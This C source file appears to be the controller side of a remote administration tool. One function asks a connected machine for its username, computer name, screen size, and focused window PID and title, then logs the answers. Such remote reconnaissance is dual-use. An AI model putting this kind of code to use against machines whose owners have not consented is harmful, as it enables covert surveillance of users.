#include <stdlib.h>
#include "types.h"
#include "logger.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"

#define COMMAND_INFO_USERNAME 0x10
#define COMMAND_INFO_COMPUTERNAME 0x11
#define COMMAND_INFO_SC_WIDTH 0x12
#define COMMAND_INFO_SC_HEIGHT 0x13
#define COMMAND_INFO_FW_PID 0x14
#define COMMAND_INFO_FW_TITLE 0x15

#define COMMAND_INFO_COUNT 6

int command_Info(void)
{
	if(net_SendCmd((uint8*)" ", 1, COMMANDS_INFO) == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to send!\n");

		return NET_LOST_CONNECTION;
	}

	int i;
	int rv = 0;
	uint8* rmsg;

	for(i = 0; i != COMMAND_INFO_COUNT; i++)
	{
		rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES);

		if(rv == NET_LOST_CONNECTION)
		{
			LOG(LOG_ERR, "Failed to receive!\n");
			free(rmsg);

			return NET_LOST_CONNECTION;

		}else if(rv == NET_TIMED_OUT){
			LOG(LOG_ERR, "Time out!\n");
			free(rmsg);

			return NET_LOST_CONNECTION;
		}

		if(rmsg[1] >= COMMAND_INFO_USERNAME && rmsg[1] <= COMMAND_INFO_FW_TITLE)
		{
			if(rmsg[1] == COMMAND_INFO_USERNAME)
			{
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_ERR, "Failed to get username!\n");
				}else{
					LOG(LOG_INFO, "Username: %s\n", rmsg + 2);
				}
			}else if(rmsg[1] == COMMAND_INFO_COMPUTERNAME){
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_ERR, "Failed to get computername!\n");
				}else{
					LOG(LOG_INFO, "Computername: %s\n", rmsg + 2);
				}
			}else if(rmsg[1] == COMMAND_INFO_SC_WIDTH){
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_ERR, "Failed to get screen width!\n");
				}else{
					LOG(LOG_INFO, "Screen width: %s\n", rmsg + 2);
				}
			}else if(rmsg[1] == COMMAND_INFO_SC_HEIGHT){
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_ERR, "Failed to get screen height!\n");
				}else{
					LOG(LOG_INFO, "Screen height: %s\n", rmsg + 2);
				}
			}else if(rmsg[1] == COMMAND_INFO_FW_PID){
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_ERR, "Failed to get focused window pid!\n");
				}else{
					LOG(LOG_INFO, "Focused window pid: %s\n", rmsg + 2);
				}
			}else if(rmsg[1] == COMMAND_INFO_FW_TITLE){
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_ERR, "Failed to get focused window title!\n");
				}else{
					LOG(LOG_INFO, "Focused window title: %s\n", rmsg + 2);
				}
			}

			if(net_SendCmd((uint8*)" ", 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
			{
				LOG(LOG_ERR, "Failed to send!\n");
				free(rmsg);

				return NET_LOST_CONNECTION;
			}
		}

		free(rmsg);
	}

	return COMMANDS_SUCC;
}